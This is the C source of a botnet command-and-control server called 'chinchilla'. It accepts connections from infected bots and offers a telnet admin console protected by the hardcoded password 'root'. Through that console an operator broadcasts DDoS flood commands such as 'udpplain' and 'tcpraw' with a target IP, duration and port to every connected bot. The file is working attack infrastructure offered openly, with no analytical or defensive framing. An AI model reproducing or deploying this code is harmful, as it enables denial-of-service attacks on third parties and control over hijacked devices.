#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
 
#define MY_MGM_PASS "root"
#define MY_MGM_PORT 8889
 
#define MAXFDS 1000000 // No way we actually reach this amount. Ever.
 
struct clientdata_t {
        uint32_t ip;
        char build[7];
        char name[100];
        char connected;
} clients[MAXFDS];

struct botstried_t {
    char name[100];
}bot[MAXFDS];

struct telnetdata_t {
        int connected;
} managements[MAXFDS];

unsigned int clientsConnected();

static volatile FILE *fileFD;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int managesConnected = 0;

#define PROMPT "\x1b[33madmin\x1b[31m@\x1b[33mbotnet\x1b[31m $ \x1b[0m"
#define WELCOME "\x1b[93mWelcome to the \x1b[91mchinchilla\x1b[93m botnet.\r\nType \x1b[91mhelp\x1b[93m to get started.\r\n"

char *help_prompt[] = {
    "udpplain: udpplain <ip> <time> <port>\r\n",
    "tcpraw: tcpraw <ip> <time> <port>\r\n"
};

int fdgets(unsigned char *buffer, int bufferSize, int fd)
{
        int total = 0, got = 1;
        while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
        return got;
}
void trim(char *str) // Remove whitespace from a string and properly null-terminate it.
{
    int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}

static int make_socket_non_blocking (int sfd)
{
        int flags, s;
        flags = fcntl (sfd, F_GETFL, 0);
        if (flags == -1)
        {
                perror ("fcntl");
                return -1;
        }
        flags |= O_NONBLOCK;

        s = fcntl (sfd, F_SETFL, flags); 
        if (s == -1)
        {
                perror ("fcntl");
                return -1;
        }
        return 0;
}


static int create_and_bind (char *port)
{
        struct addrinfo hints;
        struct addrinfo *result, *rp;
        int s, sfd;
        memset (&hints, 0, sizeof (struct addrinfo));
        hints.ai_family = AF_UNSPEC;     /* Return IPv4 and IPv6 choices */
        hints.ai_socktype = SOCK_STREAM; /* We want a TCP socket */
        hints.ai_flags = AI_PASSIVE;     /* All interfaces */
        s = getaddrinfo (NULL, port, &hints, &result);
        if (s != 0)
        {
                fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
                return -1;
        }
        for (rp = result; rp != NULL; rp = rp->ai_next)
        {
                sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
                if (sfd == -1) continue;
                int yes = 1;
                if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
                s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
                if (s == 0)
                {
                        break;
                }
                close (sfd);
        }
        if (rp == NULL)
        {
                fprintf (stderr, "Could not bind\n");
                return -1;
        }
        freeaddrinfo (result);
        return sfd;
}
void broadcast(char *msg, int us) // sends message to all bots, notifies the management clients of this happening
{
    char *broadcast;

    int sendMGM = 1;
    if(strcmp(msg, "PING") == 0) sendMGM = 0; // Don't send pings to management. Why? Because a human is going to ignore it.
    char *wot = malloc(strlen(msg) + 10);
    memset(wot, 0, strlen(msg) + 10);
    strcpy(wot, msg);
    trim(wot);
    time_t rawtime;
    struct tm * timeinfo;
    time(&rawtime);
    timeinfo = localtime(&rawtime);
    char *timestamp = asctime(timeinfo);
    trim(timestamp);
    int i;
    for(i = 0; i < MAXFDS; i++)
    {
        if(i == us || (!clients[i].connected &&  (sendMGM == 0 || !managements[i].connected))) continue;
        send(i, msg, strlen(msg), MSG_NOSIGNAL);
    }
    asprintf(&broadcast, "\x1b[93mBroadcast command to \x1b[91m%d\x1b[93m devices.\r\n", clientsConnected());
    send(us, broadcast, strlen(broadcast), MSG_NOSIGNAL);
    free(wot);
}

void *epollEventLoop(void *useless) // the big loop used to control each bot asynchronously. Many threads of this get spawned.
{
        struct epoll_event event;
        struct epoll_event *events;
        int s;
        events = calloc (MAXFDS, sizeof event);
        while (1)
        {
                int n, i;
                n = epoll_wait (epollFD, events, MAXFDS, -1);
                for (i = 0; i < n; i++)
                {
                        if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN)))
                        {
                                clients[events[i].data.fd].connected = 0;
                                close(events[i].data.fd);
                                continue;
                        }
                        else if (listenFD == events[i].data.fd)
                        {
                                while (1)
                                {
                                        struct sockaddr in_addr;
                                        socklen_t in_len;
                                        int infd, ipIndex;
 
                                        in_len = sizeof in_addr;
                                        infd = accept (listenFD, &in_addr, &in_len); // accept a connection from a bot.
                                        if (infd == -1)
                                        {
                                                if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
                                                else
                                                {
                                                        perror ("accept");
                                                        break;
                                                }
                                        }

                                        clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;
 
                                        int dup = 0;
                                        for(ipIndex = 0; ipIndex < MAXFDS; ipIndex++) // check for duplicate clients by seeing if any have the same IP as the one connecting
                                        {
                                                if(!clients[ipIndex].connected || ipIndex == infd) continue;
 
                                                if(clients[ipIndex].ip == clients[infd].ip)
                                                {
                                                        dup = 1;
                                                        break;
                                                }
                                        }
 
                                        if(dup) 
                                        {
                                                if(send(infd, "!* LOLNOGTFO\n", 13, MSG_NOSIGNAL) == -1) { close(infd); continue; } // orders all the bots to immediately kill themselves if we see a duplicate client! MAXIMUM PARANOIA
                                                if(send(infd, "DUP\n", 4, MSG_NOSIGNAL) == -1) { close(infd); continue; } // same thing as above.
                                                close(infd);
                                                continue;
                                        }
 
                                        s = make_socket_non_blocking (infd);
                                        if (s == -1) { close(infd); break; }
 
                                        event.data.fd = infd;
                                        event.events = EPOLLIN | EPOLLET;
                                        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, infd, &event);
                                        if (s == -1)
                                        {
                                                perror ("epoll_ctl");
                                                close(infd);
                                                break;
                                        }
 
                                        printf("Client joined the cnc\n");
                                        clients[infd].connected = 1;
                                }
                                continue;
                        }
                        else
                        {
                                int thefd = events[i].data.fd;
                                struct clientdata_t *client = &(clients[thefd]);
                                int done = 0;
                                client->connected = 1;
                                while (1)
                                {
                                        ssize_t count;
                                        char buf[2048];
                                        memset(buf, 0, sizeof buf);
 
                                        while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, thefd)) > 0)
                                        {
                                                if(strstr(buf, "\n") == NULL) { done = 1; break; }
                                                trim(buf);
                                                if(strcmp(buf, "PING") == 0) // basic IRC-like ping/pong challenge/response to see if server is alive
                                                {
                                                        if(send(thefd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; } // response
                                                        continue;
                                                }
                                                if(strcmp(buf, "PONG") == 0)
                                                {
                                                        //should really add some checking or something but meh
                                                        continue;
                                                }
                                                strcpy(client->name, buf);
                                        }

                                        if (count == -1)
                                        {
                                                if (errno != EAGAIN)
                                                {
                                                        done = 1;
                                                }
                                                break;
                                        }
                                        else if (count == 0)
                                        {
                                                done = 1;
                                                break;
                                        }
                                }
 
                                if (done)
                                {
                                        client->connected = 0;
                                        memset(client->name, 0, sizeof(client->name));
                                        close(thefd);
                                }
                        }
                }
        }
}
 
unsigned int clientsConnected() // counts the number of bots connected by looping over every possible file descriptor and checking if it's connected or not
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].connected) continue;
                total++;
        }
 
        return total;
}

void *titleWriter(void *sock) // just an informational banner
{
    // this LOOKS vulnerable, but it's actually not.
    // there's no way we can have 2000 digits' worth of clients/bots connected to overflow that char array
    int thefd = (int)sock;
    char string[2048];
    while(1)
    {
        memset(string, 0, 2048);
        sprintf(string, "%c]0;Loaded: %d%c", '\033', clientsConnected(), '\007');
        // \007 is a bell character... causes a beep. Why is there a beep here?
        if(send(thefd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
 
        sleep(2);
    }
}
 
void countname(int fd, char *name, int count)
{
    char *botcommand;
    int i, counter = 0;

    for(i = 0; i < count; i++)
    {
        if(strcmp(bot[i].name, name) == 0)
            return;
    }

    for(i = 0; i < MAXFDS; i++)
    {
        if(strlen(clients[i].name) <= 0)
            continue;

        if(strcmp(clients[i].name, name) == 0)
            counter++;
    }

    asprintf(&botcommand, "\x1b[93m%s\x1b[91m: \x1b[93m%d\r\n", name, counter);
    send(fd, botcommand, strlen(botcommand), MSG_NOSIGNAL);
}

void *telnetWorker(void *sock)
{
        int thefd = (int)sock, i;
        managesConnected++;
        pthread_t title;
        char buf[2048];
        memset(buf, 0, sizeof buf);
 
        if(send(thefd, "\x1b[93mшиншилла\x1b[91m: ", strlen("\x1b[93mшиншилла\x1b[91m: "), MSG_NOSIGNAL) == -1) goto end; /* failed to send... kill connection  */
        if(fdgets(buf, sizeof buf, thefd) < 1) goto end; /* no data, kill connection */
        trim(buf);
        if(strcmp(buf, MY_MGM_PASS) != 0) goto end; /* bad pass, kill connection */
        memset(buf, 0, 2048);
        if(send(thefd, "\033[1A", 4, MSG_NOSIGNAL) == -1) goto end;
        pthread_create(&title, NULL, &titleWriter, sock); /* writes the informational banner to the admin after a login */
        managements[thefd].connected = 1;

        if(send(thefd, WELCOME, strlen(WELCOME), MSG_NOSIGNAL) == -1) goto end;
        for(i = 0; i < 1; i++)
        {
            send(thefd, "\r\n", strlen("\r\n"), MSG_NOSIGNAL);
        }

        if(send(thefd, PROMPT, strlen(PROMPT), MSG_NOSIGNAL) == -1) goto end;

        while(fdgets(buf, sizeof buf, thefd) > 0)
        {
                trim(buf);
                int count = 0;

                if(strcmp(buf, "help") == 0)
                {
                    for(i = 0; i < sizeof(help_prompt) / sizeof(help_prompt[0]); i++)
                        send(thefd, help_prompt[i], strlen(help_prompt[i]), MSG_NOSIGNAL);
                }

                else if(strcmp(buf, "bots") == 0)
                {
                    for(i = 0; i < MAXFDS; i++)
                    {

                        if(strlen(clients[i].name) <= 0)
                            continue;
                        countname(thefd, clients[i].name, count);
                        strcpy(bot[count].name, clients[i].name);
                        count++;
                    }
                }

                else if(strstr(buf, "/"))
                {
                    broadcast(buf, thefd);
                }
                memset(buf, 0, 2048);

                if(send(thefd, PROMPT, strlen(PROMPT), MSG_NOSIGNAL) == -1) goto end;
                if(strlen(buf) == 0) continue;
        }

        end:    // cleanup dead socket
                managements[thefd].connected = 0;
                close(thefd);
                managesConnected--;
}
 
void *telnetListener(void *useless)
{
        int sockfd, newsockfd;
        socklen_t clilen;
        struct sockaddr_in serv_addr, cli_addr;
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) perror("ERROR opening socket");
        bzero((char *) &serv_addr, sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_addr.s_addr = INADDR_ANY;
        serv_addr.sin_port = htons(MY_MGM_PORT);

        int opt = 1;
        setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(int));
        if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("ERROR on binding");
        listen(sockfd,5);
        clilen = sizeof(cli_addr);

        while(1)
        {
                newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
                if (newsockfd < 0) perror("ERROR on accept");
                pthread_t thread;
                pthread_create( &thread, NULL, &telnetWorker, (void *)newsockfd);
        }
}
 
int main (int argc, char *argv[])
{
        signal(SIGPIPE, SIG_IGN); // ignore broken pipe errors sent from kernel
 
        int s, threads;
        struct epoll_event event;
 
        if (argc != 3)
        {
                fprintf (stderr, "Usage: %s [port] [threads]\n", argv[0]);
                exit (EXIT_FAILURE);
        }
        fileFD = fopen("output.txt", "a+"); // TOCTOU vuln if we have access to CnC
        threads = atoi(argv[2]);
 
        listenFD = create_and_bind (argv[1]); // try to create a listening socket, die if we can't
        if (listenFD == -1) abort ();
 
        s = make_socket_non_blocking (listenFD); // try to make it nonblocking, die if we can't
        if (s == -1) abort ();
 
        s = listen (listenFD, SOMAXCONN); // listen with a huge backlog, die if we can't
        if (s == -1)
        {
                perror ("listen");
                abort ();
        }
 
        epollFD = epoll_create1 (0); // make an epoll listener, die if we can't
        if (epollFD == -1)
        {
                perror ("epoll_create");
                abort ();
        }
 
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1)
        {
                perror ("epoll_ctl");
                abort ();
        }
 
        pthread_t thread[threads + 2];
        while(threads--)
        {
                pthread_create( &thread[threads + 1], NULL, &epollEventLoop, (void *) NULL); // make a thread to command each bot individually
        }
 
        pthread_create(&thread[0], NULL, &telnetListener, (void *)NULL);
 
        while(1)
        {
                broadcast("PING", -1); // ping bots every 60 sec on the main thread
 
                sleep(60);
        }
 
        close (listenFD);
 
        return EXIT_SUCCESS;
}
